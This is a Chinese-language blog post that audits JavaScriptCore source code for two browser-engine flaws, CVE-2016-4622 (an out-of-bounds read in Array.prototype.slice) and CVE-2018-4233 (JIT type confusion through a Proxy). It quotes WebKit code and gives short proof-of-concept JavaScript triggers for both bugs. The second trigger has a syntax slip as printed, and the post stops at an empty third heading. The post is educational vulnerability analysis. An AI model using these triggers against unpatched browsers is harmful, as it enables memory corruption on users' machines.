---
layout: post
title:  "CVE 代码审计-updating"
categories: pwn
tags: pwn
excerpt: CVE 代码审计-updating
mathjax: true
---

* content
{:toc}

### Overview

开这个帖的目的是从代码审计的角度记录一些漏洞的原理，抛开后续利用的部分，保持对代码的敏感。

#### 1. JSC的Array.prototype.slice 越界访问 (CVE-2016-4622)

漏洞存在于JavascriptCore 的 %Array.prototype.slice 。

1. 首先获取array 的长度
2. 将参数（开始和结束的索引参数）转换为int，并将它们限制了[0，length）的长度范围
3. 如果fastpath 可用，把从begin到end的数据拷贝到一个新创建的array中，没有边界检查

问题在于参数转换为int时可以执行到用户定义的代码。参数绑定的valueOf函数会被调用，在这个callback中可以定义array 的长度，造成oob 越界访问

```cpp
EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
{
    // http://developer.netscape.com/docs/manuals/js/client/jsref/array.htm#1193713 or 15.4.4.10
    JSObject* thisObj = exec->thisValue().toThis(exec, StrictMode).toObject(exec);
    if (!thisObj)
        return JSValue::encode(JSValue());
    unsigned length = getLength(exec, thisObj);  //[1]
    if (exec->hadException())
        return JSValue::encode(jsUndefined());

    unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);   // [2]
    unsigned end = argumentClampedIndexFromStartOrEnd(exec, 1, length, length);

    std::pair<SpeciesConstructResult, JSObject*> speciesResult = speciesConstructArray(exec, thisObj, end - begin);
    // We can only get an exception if we call some user function.
    if (UNLIKELY(speciesResult.first == SpeciesConstructResult::Exception))
        return JSValue::encode(jsUndefined());

    if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath && isJSArray(thisObj))) {  //[3]
        if (JSArray* result = asArray(thisObj)->fastSlice(*exec, begin, end - begin))
            return JSValue::encode(result);
    }

    JSObject* result;
    if (speciesResult.first == SpeciesConstructResult::CreatedObject)
        result = speciesResult.second;
    else
        result = constructEmptyArray(exec, nullptr, end - begin);

    unsigned n = 0;
    for (unsigned k = begin; k < end; k++, n++) {
        JSValue v = getProperty(exec, thisObj, k);
        if (exec->hadException())
            return JSValue::encode(jsUndefined());
        if (v)
            result->putDirectIndex(exec, n, v);
    }
    setLength(exec, result, n);
    return JSValue::encode(result);
}
```

[代码地址](https://github.com/WebKit/webkit/blob/320b1fc3f6f47a31b6ccb4578bcea56c32c9e10b/Source/JavaScriptCore/runtime/ArrayPrototype.cpp#L848)


```cpp
static inline unsigned argumentClampedIndexFromStartOrEnd(ExecState* exec, int argument, unsigned length, unsigned undefinedValue = 0)
{
    JSValue value = exec->argument(argument);
    if (value.isUndefined())
        return undefinedValue;

    double indexDouble = value.toInteger(exec);
    if (indexDouble < 0) {
        indexDouble += length;
        return indexDouble < 0 ? 0 : static_cast<unsigned>(indexDouble);
    }
    return indexDouble > length ? length : static_cast<unsigned>(indexDouble);
}
```

poc

```js
var a = [ ];
for (var i = 0; i < 100; i++) { 
    a.push( i + 0.123);
}
var end = {
    valueOf : function () {
        a.length = 0;
        return 10;
    }
};
a.slice (0,end);
// [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]
```

问题1: 如何确保修改a.length后,a的长度真的改变了 ?

查看a.length 的实现 JSArray::setLength

```cpp
    unsigned lengthToClear = butterfly->publicLength() - newLength;
    unsigned costToAllocateNewButterfly = 64; // a heuristic.
    if (lengthToClear > newLength &&
        lengthToClear > costToAllocateNewButterfly) {
        reallocateAndShrinkButterfly(exec->vm(), newLength);
        return true;
    }
```
将length缩小，要确保lengthToClear 大于64才行，也就是新旧length 的差大于64 。所以创建了100个元素的array


#### 2. JSC的JIT compiler 优化问题(CVE-2018-4233) Pwn2Own '18

优化的目的是检测出冗余的check,并消灭它. 例如

```
v0 = LoadArgument 0  
CheckIsInteger v0
v1 = IntegerAdd v0 , 42  
CheckIsInteger v0  
v2 = IntegerMul v0 , 42
```
其中两次检查v0是否属于int就是冗余的检测，简单的相加后类型不会改变

通过控制流图追踪在每个路径上的check。必须考虑到两次check中object的类型变化,例如

```
v0 = LoadArgument 0 
CheckHasProperty v0 , "foo " 
v1 = LoadProperty v0 , "foo " 
v2 = ToNumber v1 
v3 = NumberAdd v2 , 1
CheckHasProperty v0 , "foo"
StoreProperty v0 , "foo ", v3
```
第二次CheckHasProperty的check就非常必要，在ToNumber的操作过程中可能触发任何Javascript code,foo属性也可能被删除。
为了检测这种情况，编译器需要了解IR中的所有操作及相关的副作用.缺少类型检查可能导致类型混淆漏洞。

CVE-2018-4233 漏洞中假定 CreateThis (用于在constructor中创建新object)没有任何副作用，在优化中消除了多余的check。然而通过Proxy中定义handler的get方法，可以在CreateThis过程中执行任意的javascript code

POC中JIT compiler假设Constructor 函数的第一个参数是double array.而且在开始也check通过，但是check过后，在Proxy callback中修改了array类型导致了double 和 JS value的类型混淆漏洞。


```js
function Constructor(a,v) { 
    a[0] = v;
}
var trigger = false;
var arg = null;
var handler = {
    get(target, prop) {
        if(trigger){
            arg[0] = {};
        }
        return target[prop];
    }
};
var EvilProxy = new Proxy(Constructor, handler);
for(var i=0;i<100000;i++>){
    new EvilProxy([1.1,2.2,3.3],13.37);
}
trigger = true;
arg = [1.1,2.2,3.3]
new EvilProxy(arg,3.54484805889626e−310);
arg[0]
```
3.54484805889626e−310 表示为 0x414141414141 ，被当作一个指针解析，造成了access violation

![](IMG/cve-updating/cve-2018-4233.png)

#### 3.